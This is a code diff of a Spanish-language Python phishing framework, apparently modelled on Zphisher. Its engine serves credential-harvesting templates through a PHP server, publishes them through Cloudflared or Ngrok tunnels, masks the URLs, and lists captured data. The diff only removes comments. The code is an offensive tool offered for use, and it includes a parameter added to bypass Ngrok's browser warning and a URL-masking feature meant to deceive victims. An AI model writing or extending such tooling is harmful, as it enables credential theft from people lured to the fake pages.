@@ -15,17 +15,17 @@ from core.server import PhishingServer
 
 class PhishingEngine:
     def __init__(self):
-        self.template_manager = None  # Se inicializa después
+        self.template_manager = None
         self.server = PhishingServer()
         self.selected_template = None
         self.selected_tunnel = None
         self.server_running = False
         self.mask_text = None
         self.custom_port = 8080
-        self.website = None  # Nombre de la plantilla seleccionada
-        self.mask = None  # Máscara para la URL
+        self.website = None
+        self.mask = None
 
-        # Túneles disponibles (igual que Zphisher: Cloudflare, Ngrok, Localhost)
+
         self.tunnels = {
             '1': {'name': 'Cloudflared', 'obj': CloudflaredTunnel()},
             '2': {'name': 'Ngrok', 'obj': NgrokTunnel()},
@@ -33,11 +33,10 @@ class PhishingEngine:
         }
 
     def start(self):
-        """Inicia el motor principal"""
+
         clear_screen()
         show_banner()
 
-        # Verificar conexión a internet
         if not check_internet():
             Colors.print_warning("Sin conexión a internet. Algunas funciones pueden no estar disponibles")
 
@@ -50,11 +49,10 @@ class PhishingEngine:
         Colors.print_success(f"Listo! {len(templates)} plantillas disponibles")
         time.sleep(1)
 
-        # Mostrar menú principal
         self.main_menu()
 
     def _load_templates(self):
-        """Carga las plantillas disponibles desde templates/"""
+
         templates_dir = 'templates'
         if os.path.exists(templates_dir):
             templates = [d for d in os.listdir(templates_dir)
@@ -67,7 +65,6 @@ class PhishingEngine:
             clear_screen()
             show_banner()
 
-            # Mostrar estado actual
             self._show_status()
 
             # Mostrar opciones
@@ -146,7 +143,6 @@ class PhishingEngine:
         print(Colors.colorize("=" * 50, Colors.PURPLE))
         print()
 
-        # Mostrar plantillas
         for idx, template in enumerate(templates, 1):
             status = "✓" if template == self.selected_template else " "
             # Detectar si es PHP o HTML
@@ -208,7 +204,7 @@ class PhishingEngine:
         press_enter()
 
     def _ask_port(self):
-        """Pregunta por puerto personalizado"""
+
         print()
         option = input(Colors.colorize("¿Querés cambiar el puerto? (s/N): ", Colors.YELLOW))
         if option.lower() == 's':
@@ -220,7 +216,7 @@ class PhishingEngine:
         return 8080
 
     def _ask_mask(self):
-        """Pregunta por máscara de URL"""
+
         print()
         option = input(Colors.colorize("¿Querés enmascarar la URL? (s/N): ", Colors.YELLOW))
         if option.lower() == 's':
@@ -254,17 +250,14 @@ class PhishingEngine:
                 return
             self.stop_server()
 
-        # Preguntar puerto personalizado
         port = self._ask_port()
         self.custom_port = port
 
-        # Preguntar máscara de URL
         self.mask_text = self._ask_mask()
 
         Colors.print_info("Iniciando servidor...")
         show_loading("Configurando entorno", 2)
 
-        # Iniciar servidor PHP
         if not self.server.start(self.selected_template, port):
             Colors.print_error("Error al iniciar el servidor")
             press_enter()
@@ -292,13 +285,11 @@ class PhishingEngine:
         # Mostrar URL
         url = tunnel_obj.get_url()
         if url:
-            # Si es Ngrok, agregar parámetro para saltar advertencia
             if 'ngrok' in url:
                 url = url + '/?ngrok-skip-browser-warning=1'
 
             Colors.print_info(f"URL Pública: {url}")
 
-            # Generar URL enmascarada si el usuario lo pidió
             if self.mask_text:
                 masked = mask_url(url, self.mask_text)
                 if masked['success']:
@@ -318,7 +309,6 @@ class PhishingEngine:
             self.stop_server()
 
     def stop_server(self):
-        """Detiene el servidor y desconecta túneles"""
         Colors.print_info("Deteniendo servidor...")
 
         # Detener servidor
@@ -334,7 +324,6 @@ class PhishingEngine:
         press_enter()
 
     def show_captures(self):
-        """Muestra las capturas almacenadas"""
         clear_screen()
         show_banner()
 
@@ -369,7 +358,6 @@ class PhishingEngine:
         press_enter()
 
     def show_about(self):
-        """Muestra información sobre la herramienta"""
         clear_screen()
         show_banner()
 
